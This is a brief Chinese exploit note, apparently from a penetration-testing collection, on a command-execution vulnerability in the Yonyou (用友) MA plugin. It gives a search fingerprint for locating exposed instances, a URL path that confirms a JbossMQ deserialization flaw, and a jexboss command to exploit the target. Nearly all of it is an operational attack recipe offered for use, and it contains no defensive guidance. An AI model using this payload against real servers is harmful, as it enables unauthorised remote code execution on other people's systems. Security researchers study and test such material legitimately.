# 用友MA插件存在命令执行漏洞

用友 ｜ 命令执行 ｜ —
- **指纹**：`app="用友-MA插件"`

**Payload**
```
在url后面添加如下地址：/jbossmq-httpil/HTTPServerILServlet，出现如下页面即证明存在JbossMQ反序列化漏洞
使用工具利用[jexboss](https://github.com/joaomatosf/jexboss)** ** [https://github.com/joaomatosf/jexboss/archive/refs/heads/master.zip](https://github.com/joaomatosf/jexboss/archive/refs/heads/master.zip)
python3 jexboss.py -host http://ip
```